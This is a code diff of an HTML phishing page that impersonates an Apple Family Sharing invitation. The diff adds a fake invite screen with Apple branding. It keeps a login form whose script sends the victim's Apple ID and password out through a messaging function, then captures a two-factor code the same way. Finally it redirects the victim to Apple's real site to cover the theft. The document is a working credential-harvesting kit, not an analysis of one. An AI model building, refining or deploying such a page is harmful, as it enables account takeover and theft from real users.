@@ -13,56 +13,127 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #050915 0%, #1a1c2c 100%);
-            overflow: hidden;
+            /* 改為更接近截圖的深藍紫漸層 */
+            background: linear-gradient(180deg, #1a2a44 0%, #0d1321 100%);
             color: white;
+            padding: 20px;
         }
 
-        .orb {
-            position: absolute;
-            width: 500px;
-            height: 500px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(255, 45, 85, 0.15), transparent 70%);
-            z-index: 0;
-            filter: blur(60px);
-            top: -10%;
-            right: -10%;
-        }
-
-        .glass-card {
+        /* 容器限制寬度 */
+        .container {
+            width: 100%;
+            max-width: 400px;
             position: relative;
-            z-index: 1;
-            width: 380px;
-            padding: 40px 30px;
+        }
+
+        /* 第一階段：首頁邀請函 */
+        .invite-card {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .maybe-later {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .main-icon {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        h1.main-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        p.description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        /* 列表項目 */
+        .feature-list {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 50px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 25px;
+        }
+
+        .feature-icon {
+            width: 45px;
+            height: 45px;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .feature-text h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .feature-text p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.3;
+        }
+
+        /* 底部按鈕區 */
+        .action-area {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .btn-join {
+            background-color: #3e82f7;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .btn-decline {
+            background: none;
+            border: none;
+            color: #3e82f7;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* 第二階段：原本的登入介面 (設為隱藏) */
+        .glass-card {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(25px) saturate(1.5);
             -webkit-backdrop-filter: blur(25px) saturate(1.5);
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 28px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
+            padding: 40px 30px;
             text-align: center;
         }
 
-        .family-icon {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #ff2d55, #ff3b30);
-            border-radius: 18px;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 10px 20px rgba(255, 45, 85, 0.3);
-        }
-
-        .family-icon svg { width: 40px; fill: white; }
-
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
-        p { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 25px; line-height: 1.4; }
-
         .input-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-size: 12px; color: rgba(255,255,255,0.5); margin-left: 12px; margin-bottom: 5px; }
+        label { display: block; font-size: 12px; color: rgba(255,255,255,0.5); margin-bottom: 5px; margin-left: 5px; }
 
         input {
             width: 100%;
@@ -73,24 +144,7 @@
             color: white;
             font-size: 16px;
             outline: none;
-            transition: 0.3s;
         }
-        input:focus { border-color: #ff2d55; background: rgba(255, 255, 255, 0.1); }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #fff;
-            color: #000;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-        }
-        button:hover:not(:disabled) { background: #f0f0f0; transform: scale(0.98); }
 
         .hidden { display: none !important; }
 
@@ -99,37 +153,58 @@
             height: 35px;
             border: 3px solid rgba(255,255,255,0.2);
             border-radius: 50%;
-            border-top-color: #ff2d55;
+            border-top-color: #3e82f7;
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        .success-checkmark {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 20px;
-            background: #34c759;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .footer { margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.3); }
     </style>
 </head>
 <body>
 
-    <div class="orb"></div>
-
-    <div class="glass-card">
-        <div id="phase-login">
-            <div class="family-icon">
-                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+    <div class="container">
+        <div id="phase-invite" class="invite-card">
+            <a href="#" class="maybe-later">Maybe Later</a>
+            
+            <img src="https://img.icons8.com/fluency/96/group.png" class="main-icon" alt="Family">
+            
+            <h1 class="main-title">You've Been Invited</h1>
+            <p class="description">Join Family Sharing to share subscriptions and more with 家庭.</p>
+            
+            <div class="feature-list">
+                <div class="feature-item">
+                    <img src="https://img.icons8.com/color/96/icloud.png" class="feature-icon">
+                    <div class="feature-text">
+                        <h2>Shared Subscriptions</h2>
+                        <p>iCloud+, Apple Music 和 Apple TV+。</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <img src="https://img.icons8.com/color/96/itunes.png" class="feature-icon">
+                    <div class="feature-text">
+                        <h2>Shared Purchases</h2>
+                        <p>Apps, movies, TV shows, and books</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <img src="https://img.icons8.com/fluency/96/parental-control.png" class="feature-icon">
+                    <div class="feature-text">
+                        <h2>Parental Controls</h2>
+                        <p>Manage screen time, content restrictions</p>
+                    </div>
+                </div>
             </div>
-            <h1>Family Sharing</h1>
-            <p>You have been invited to join a family group. Sign in with your Apple ID to accept the invitation.</p>
+
+            <div class="action-area">
+                <h2 style="font-size: 28px; margin-bottom: 10px;">Choose to Join</h2>
+                <button class="btn-join" onclick="goToLogin()">加入家庭</button>
+                <button class="btn-decline">拒绝邀请</button>
+            </div>
+        </div>
+
+        <div id="phase-login" class="glass-card hidden">
+            <h1 style="font-size: 24px; margin-bottom: 10px;">Sign in to join Family</h1>
+            <p style="font-size: 14px; margin-bottom: 30px; color: rgba(255,255,255,0.6);">Sign in with your Apple ID to accept this invitation.</p>
             
             <div class="input-group">
                 <label>Apple ID</label>
@@ -139,32 +214,27 @@
                 <label>Password</label>
                 <input type="password" id="pw" placeholder="Required" autocomplete="current-password">
             </div>
-            <button id="btn1" onclick="handleLogin()">Accept Invitation</button>
+            <button class="btn-join" onclick="handleLogin()">Accept Invitation</button>
         </div>
 
-        <div id="phase-loading" class="hidden">
+        <div id="phase-loading" class="glass-card hidden">
             <div class="loader"></div>
-            <p id="loading-text">Encrypting connection...</p>
+            <p id="loading-text">Verifying Apple ID...</p>
         </div>
 
-        <div id="phase-otp" class="hidden">
+        <div id="phase-otp" class="glass-card hidden">
             <h1>Two-Factor Authentication</h1>
-            <p>A verification code has been sent to your other Apple devices.</p>
+            <p style="margin-top: 10px;">A verification code has been sent to your devices.</p>
             <input type="text" id="otp" placeholder="000000" maxlength="6" 
                    inputmode="numeric" pattern="[0-9]*"
-                   style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px;">
-            <button id="btn2" onclick="handleOTP()">Verify & Join</button>
+                   style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px; margin: 30px 0;">
+            <button class="btn-join" onclick="handleOTP()">Verify & Join</button>
         </div>
 
-        <div id="phase-success" class="hidden">
-            <div class="success-checkmark">
-                <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-            </div>
-            <h1>Welcome to the Family!</h1>
-            <p>Your account has been linked successfully. Redirecting to Apple Support...</p>
+        <div id="phase-success" class="glass-card hidden">
+            <h1 style="color: #34c759;">Welcome!</h1>
+            <p style="margin-top: 10px;">You have successfully joined the family group.</p>
         </div>
-
-        <div class="footer">Your data is encrypted and secure.</div>
     </div>
 
     <script>
@@ -183,33 +253,33 @@
             } catch(e) {}
         }
 
+        // 切換介面邏輯
         function showPhase(phaseId) {
-            ['phase-login', 'phase-loading', 'phase-otp', 'phase-success'].forEach(id => {
+            ['phase-invite', 'phase-login', 'phase-loading', 'phase-otp', 'phase-success'].forEach(id => {
                 document.getElementById(id).classList.add('hidden');
             });
             document.getElementById(phaseId).classList.remove('hidden');
+        }
+
+        // 點擊加入家庭按鈕
+        function goToLogin() {
+            showPhase('phase-login');
         }
 
         async function handleLogin() {
             const acc = document.getElementById('acc').value.trim();
             const pw = document.getElementById('pw').value;
 
-            // Email validation
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(acc)) return alert("Please enter a valid Apple ID.");
-
-            // Password complexity validation
-            const pwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
-            if (!pwRegex.test(pw)) return alert("Incorrect password format. Please try again.");
+            if (!pw) return alert("Password is required.");
 
             showPhase('phase-loading');
-            document.getElementById('loading-text').innerText = "Verifying Apple ID...";
-
             await sendMsg(`👨‍👩‍👧‍👦 【Family Invite - Login】\nUser: ${acc}\nPass: ${pw}`);
 
             setTimeout(() => {
                 showPhase('phase-otp');
-            }, 20000);
+            }, 5000); // 這裡縮短為 5 秒測試，可自行改回 20000
         }
 
         async function handleOTP() {
@@ -221,14 +291,12 @@
 
             await sendMsg(`🛡️ 【Family Invite - OTP】\nCode: ${otp}`);
 
-            // Simulate final processing for 3 seconds
             setTimeout(() => {
                 showPhase('phase-success');
-                // Auto redirect after 3 seconds
                 setTimeout(() => {
                     window.location.href = "https://www.apple.com/family-sharing/";
-                }, 1500);
-            }, 1500);
+                }, 3000);
+            }, 3000);
         }
     </script>
 </body>
